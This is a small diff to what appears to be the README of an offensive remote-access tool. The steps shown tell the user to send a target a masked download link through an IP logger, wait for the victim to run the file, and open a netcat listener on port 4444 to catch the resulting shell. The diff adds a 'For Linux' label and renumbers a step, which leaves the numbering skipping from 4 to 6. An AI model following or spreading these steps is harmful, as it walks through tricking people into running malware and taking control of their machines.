@@ -46,9 +46,10 @@ This tool is designed to:
 2. Send the masked download link using a shortened IP logger service.
 3. Wait for the target to run the file.
 4. Connect to the shell:
+   For Linux:
    ```bash
    nc64 -lvp 4444
-5. Enjoy responsibly (or face karmic doom).
+6. Enjoy responsibly (or face karmic doom).
   ---
 
 
